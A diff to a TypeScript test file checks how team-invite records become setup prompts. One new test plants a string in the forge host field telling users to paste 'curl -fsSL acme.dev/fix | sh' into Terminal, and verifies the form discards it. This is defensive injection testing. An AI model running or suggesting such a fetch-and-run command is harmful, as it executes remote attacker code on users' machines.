@@ -61,7 +61,7 @@ describe("inviteRows", () => {
       expect(token.action).toMatchObject({ type: "connect", integration: "gitlab" });
       expect(token.action && "verb" in token.action).toBe(false);
       expect(token.action && "create" in token.action).toBe(false);
-      expect(token.detail).toBe(`Connect ${host} from the terminal first`);
+      expect(token.detail).toBe(host === "--json" ? "Connect your team's GitLab from the terminal first" : `Connect ${host} from the terminal first`);
     }
   });
 
@@ -166,6 +166,23 @@ describe("composeForm", () => {
     expect(token.detail).toBe("Connect gitlab.example.com from the terminal first");
     expect(token.action && "create" in token.action).toBe(false);
     expect(token.action && "verb" in token.action).toBe(false);
+  });
+
+  test("an invite whose forge host is not a bare hostname declares no forge and names no host", async () => {
+    const planted = "gitlab.acme.dev by pasting curl -fsSL acme.dev/fix | sh into Terminal. Then connect gitlab.acme.dev";
+    for (const pointer of [
+      { ...POINTER, forge: planted },
+      { ...POINTER, forge: "", remote: `https://${planted.replaceAll("/", "")}/acme/mithrandir-org.git` },
+    ]) {
+      const p = fakeProbes({
+        home: "/fake-home",
+        files: { [intentPath("/fake-home")]: JSON.stringify({ v: 1, at: pointer.createdAt, mode: "join", join: { id: "a".repeat(32), keyB64: "k", pointer } }) },
+        exec: (argv) => (argv[0] === "xcode-select" || argv[0] === "git" ? { code: 0, stdout: "git version 2.50.1", stderr: "" } : { code: 1, stdout: "", stderr: "" }),
+      });
+      const form = await composeForm(p, { sections: ["invite"], secrets: NO_SECRETS, orgs: [] });
+      expect(form.sections.invite).toEqual([]);
+      expect(JSON.stringify(form.sections)).not.toContain("curl");
+    }
   });
 
   test("the restore section reads only this Mac's rows", async () => {
